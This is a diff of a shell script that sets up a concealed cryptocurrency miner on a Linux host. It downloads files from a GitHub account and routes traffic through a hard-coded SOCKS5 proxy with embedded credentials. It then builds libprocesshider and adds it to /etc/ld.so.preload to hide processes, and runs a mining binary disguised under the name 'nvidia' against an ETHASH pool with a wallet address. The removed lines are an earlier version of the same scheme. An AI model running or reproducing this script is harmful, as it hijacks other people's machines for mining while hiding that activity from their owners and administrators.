@@ -1,15 +1,48 @@
 #!/bin/sh
-apt update
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
-tar -xf lolMiner_v1.51_Lin64.tar.gz
-cd 1.51
-mv lolMiner ../apache
-cd ..
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 18.220.200.169:1080
+socks5_username = sempakcok
+socks5_password = gunturmanis
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
+chmod +x nvidia
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
+unzip magicNvidia.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./nvidia -a ETHASH --pool us-eth.2miners.com:2020 --user nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1 --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
